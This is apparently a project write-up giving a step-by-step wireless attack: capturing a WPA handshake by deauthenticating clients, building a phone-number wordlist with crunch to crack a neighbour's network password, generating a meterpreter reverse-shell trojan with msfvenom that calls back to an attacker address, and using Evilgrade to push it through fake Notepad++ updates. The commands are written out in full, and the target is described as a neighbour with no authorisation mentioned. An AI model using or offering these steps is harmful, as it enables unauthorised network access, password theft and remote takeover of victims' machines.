# Wireless Hacking
Wireless Hacking will be more efficient if we know the attack flow of the target. In this project, the wireless hacking tools that will be using are Airgeddon and Evilgrade.

Airgeddon is written in bash and multi-use for Linux system to audit wireless networks and developed by V1s1t0rsh3r3. Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.

## Attacking Procedures
### 1. Reconnaissance and Scanning
![image](https://user-images.githubusercontent.com/86700132/127674455-aa069a9b-2705-4043-a6c0-edc3b64eb545.png)
![image](https://user-images.githubusercontent.com/86700132/127674709-4c9650ce-6c1a-437e-8f20-894324a5b79c.png)

After opening the Airgeddon main menu terminal window in the Kali Linux, the first step we need to do is to capture some handshake. Choose option 5 and the script will move to handshake menu.



![image](https://user-images.githubusercontent.com/86700132/127674985-fd2cfa31-363b-4af4-8533-9dd76d8e25d5.png)
![image](https://user-images.githubusercontent.com/86700132/127675004-8be75330-27d7-4dc6-875d-1b5565bd170a.png)

The next step we need to perform is to scan on all available wireless networks detected by wlan0mon and select the targeted network by choosing option 4. After capturing some network, press CTRL+C to stop the scan.



![image](https://user-images.githubusercontent.com/86700132/127675108-326d01e0-6ae5-43a3-b6a9-0dbe17e7a047.png)

Then, select the target network. In this project, we choose No.17, which is Lenovo P70-A.



![image](https://user-images.githubusercontent.com/86700132/127675583-2e0f7d6d-fa24-4e5e-9d1d-8945fc55307e.png)

Next, choose option 5 capture the handshake. In our case, we are going to capture network for Lenovo P70-A.



![image](https://user-images.githubusercontent.com/86700132/127675707-16a8de3f-9b14-4963-aabd-92c8d9503928.png)
![image](https://user-images.githubusercontent.com/86700132/127675844-d927a5e6-7082-400a-9224-ab27beb98401.png)

Next step, select the deauth / disassoc amok mdk3 attack which is option 1 and wait around 20 seconds to forcefully disconnect a client from the access point and get the handshake.



![image](https://user-images.githubusercontent.com/86700132/127675907-a65d30ea-9ccf-409a-a236-7033a8dd610d.png)

The script will ask whether you get the handshake or not, insert y and press enter if you successful get the handshake which we will using it to perform wireless attack. Last, return to main menu and prepare for gaining access.


### 2. Gaining Access
#### 1st STEP : Password cracking by using Airgeddon 

Once we receive the network password hash from reconnaissance and scanning, we are going to crack that hash so that we can get the network password without identify the private key. In this case, we use a dictionary password cracking attack. We create a dictionary file that consists of list of phone numbers manually, since we know that the network password is phone number of our neighbor. Then we crack the network password by using the dictionary file.

Open a new terminal and use crunch to create a dictionary file.
```
root@kali:~# crunch 10 10 0123456789 -t 016%%%%%% -o /root/Desktop/phonenumber.txt
```


Come back to airgeddon terminal window. From the main menu choose option 6, which is offline WPA/WPA2 decrypt menu. 

![image](https://user-images.githubusercontent.com/86700132/127677222-2fe4cfaf-b39f-43e0-8689-7041864db89d.png)

Then choose dictionary attack against capture file and enter the path of wordlists file.
```
/root/Desktop/phonenumber.txt
```
![image](https://user-images.githubusercontent.com/86700132/127677552-37a11cb5-7de7-4097-99b4-b41002e509f5.png)



The terminal will start to run the dictionary file.

![image](https://user-images.githubusercontent.com/86700132/127677747-294a912f-7360-4dd3-a13c-802f00137896.png)

 
 
The terminal will display word “KEY FOUND!” once the key is detected.

![image](https://user-images.githubusercontent.com/86700132/127677772-9ffe6fa1-92ab-42f5-b3b5-581ef94b2bb8.png)


 
Finally, press enter to store the record in the default path.

![image](https://user-images.githubusercontent.com/86700132/127677843-57fbc3a1-c9ad-4ca7-a707-502e782e3388.png)


 
#### 2nd STEP : Create a reverse shell trojan using Metasploit
In this step, we create a reverse shell trojan so that targeted machine will listen to kali linux meterpreter shell once it is executed.

Now create a reverse shell trojan called "shell.exe" by using code below as figure below. This trojan will make the targeted machine listen to kali linux meterpreter shell. This trojan is created and located at root directory in kali linux.
```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.142 LPORT=4444 -f exe > shell.exe
```
 
 
#### 3rd STEP : create a notepadplus module and spoof notepad++ website using Evilgrade
In this step, we create a notepadplus module and spoof notepad++ website. This module can be retrieved from spoof website. Once victim run his/her notepad++.exe and click yes button for updating their notepad++, their machine will request update module, which is notepadplus module from our spoof website. Then their machine starts to download the update received from notepadplus module and at the same time, the notepadplus also send the trojan to targeted machine and make it execute the trojan so that targeted machine listen to kali linux meterpreter shell.

Start the Evilgrade by typing the following commands:
```
root@kali:~# cd evilgrade
root@kali:~# ./evilgrade
```

If Evilgrade run successfully, then it will load the modules as shown in diagram below:

![image](https://user-images.githubusercontent.com/86700132/127678337-cf19482f-dcd5-4518-9886-fa2160a2ee52.png)



After Evilgrade is intialized, type configure notepadplus to create a notepadplus module and spoof notepad++ website.

Type command below:
```
evilgrade>  configure notepadplus
```

Then, we inject the malicious code into the notepadplus module. This malicious code will execute the trojan we set before when victim is updating their notepad++.
```
evilgrade(notepadplus)>set agent '["<%OUT%>/root/shell.exe<%OUT%>"]'
```
![image](https://user-images.githubusercontent.com/86700132/127678526-94f216f1-98c7-4e39-ae81-f3ce0f457463.png)



To ensure malicious code is properly injected, type command below to view the module and spoof website properties.
```
evilgrade(notepadplus)>show options
```
![image](https://user-images.githubusercontent.com/86700132/127678612-c004cf91-97a6-4a2c-87bb-d5a2c62c7c24.png)





